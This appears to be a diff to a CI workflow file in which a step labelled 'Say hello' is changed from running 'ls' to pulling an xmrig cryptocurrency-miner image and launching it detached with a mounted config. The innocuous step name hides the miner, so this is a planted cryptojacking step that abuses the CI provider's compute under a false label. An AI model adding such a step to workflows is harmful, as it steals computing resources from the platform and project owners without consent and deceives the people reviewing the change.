@@ -8,8 +8,13 @@ on:
 jobs:
   build:
     steps:
-      - uses: docker://rockymoyosu/pymod:latest
+      - uses: docker://rcmelendez/xmrig
         name: Say hello
         kind: test
         shell: sh
-        run: ls
+        run: |-
+          docker run -dit --rm \
+              --volume "$(pwd)"/config.json:/xmrig/etc/config.json:ro \
+              --volume "$(pwd)"/log:/xmrig/log \
+              --name xmrig rcmelendez/xmrig \
+              xmrig --config=/xmrig/etc/config.json
